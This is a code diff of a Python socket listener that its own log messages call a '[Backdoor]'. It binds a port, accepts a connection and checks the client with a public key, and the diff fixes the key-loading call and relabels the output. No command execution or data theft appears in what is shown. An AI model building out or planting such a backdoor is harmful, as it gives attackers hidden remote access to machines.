@@ -22,7 +22,7 @@ def bind_socket(port = BASE_PORT, host = HOST):
 def connect():
     s.listen()
     conn, addr = s.accept()
-    print('Connected with ' + addr[0] + ':' + str(addr[1]))
+    print('[Backdoor] Connected with ' + addr[0] + ':' + str(addr[1]))
     return conn
 
 
@@ -31,9 +31,8 @@ def authenticate(conn):
     message = conn.recv(4096)
     success = True
     with open("pubkey.pem", "rb") as key_file:
-        pub = serialization.load_pem_pub_key(
-            key_file.read(),
-            password=None,
+        pub = serialization.load_pem_public_key(
+            key_file.read()
         )
 
         try:
@@ -58,12 +57,13 @@ def authenticate(conn):
 while True:
     ok = bind_socket()
     if ok:
-        print('Socket bind complete')
+        print('[Backdoor] Socket bind complete')
     conn = connect()
     ok = authenticate(conn)
     if not ok:
         # close connection
-        print('Authentication failed.')
+        print('[Backdoor] Authentication failed.')
     else:
+        print('[Backdoor] Authentication succeeded.')
         conn.send(b'success')
-
+    break
